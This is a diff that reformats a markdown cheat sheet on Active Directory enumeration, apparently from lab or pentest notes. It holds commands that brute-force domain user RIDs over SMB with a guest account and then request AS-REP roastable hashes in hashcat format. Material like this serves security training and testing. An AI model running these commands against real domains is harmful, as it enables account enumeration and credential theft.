@@ -8,14 +8,14 @@ keywords: Internals
 ---
 
 # Active Directory Enumeration
- - [Rid Brute via SMB](https://medium.com/@e.escalante.jr/active-directory-workshop-brute-forcing-the-domain-server-using-crackmapexec-pt-6-feab1c43d970)
+[Rid Brute via SMB](https://medium.com/@e.escalante.jr/active-directory-workshop-brute-forcing-the-domain-server-using-crackmapexec-pt-6-feab1c43d970)
 
-   **Requires:** Guest read access to IPC$ (Remote IPC) SMB File Share 
-   ```
-   nxc smb 10.10.10.192 -u 'guest' -p '' --rid-brute > sid.txt
-   cat sid.txt | awk -F': ' '{print $2}' | awk '{print $1}' | sed 's/BLACKFIELD\\//' > users.txt
-   GetNPUsers.py BLACKFIELD/ -usersfile users.txt -format hashcat
-   ```
+**Requires:** Guest read access to IPC$ (Remote IPC) SMB File Share 
+```
+nxc smb 10.10.10.192 -u 'guest' -p '' --rid-brute > sid.txt
+cat sid.txt | awk -F': ' '{print $2}' | awk '{print $1}' | sed 's/BLACKFIELD\\//' > users.txt
+GetNPUsers.py BLACKFIELD/ -usersfile users.txt -format hashcat
+```
 
 # Active Directory Exploitation Strategies
  - [ASREPRoasting via Impacket](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast)
